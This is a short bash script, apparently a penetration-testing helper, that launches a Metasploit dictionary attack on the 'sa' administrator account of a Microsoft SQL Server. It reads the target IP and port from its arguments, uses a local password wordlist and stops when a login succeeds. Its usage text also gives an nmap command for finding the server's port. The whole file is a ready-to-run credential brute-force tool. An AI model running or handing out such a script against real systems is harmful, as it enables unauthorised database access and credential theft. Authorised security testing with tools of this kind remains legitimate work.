#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target IP> [Instance Port]"
	echo "$0 will run a dictionary attack against the sa account using /opt/wordlists/MikesList.short.sorted.txt"
	echo "If a specific SQL instance should be targeted other than the default (on 1433), use 'nmap -Pn -n -p 1433,1434 --script=ms-sql-info <IP>' to discover the port."
	echo ""
}


if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

TARGETIP=$1
INSTANCEPORT=1433

if [ $# -gt 1 ]; then
	INSTANCEPORT=$2
fi

msfconsole -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGETIP; set PASS_FILE /opt/wordlists/MikesList.short.sorted.txt; set THREADS 5; set VERBOSE false; set STOP_ON_SUCCESS true; set RPORT $INSTANCEPORT; exploit; exit"

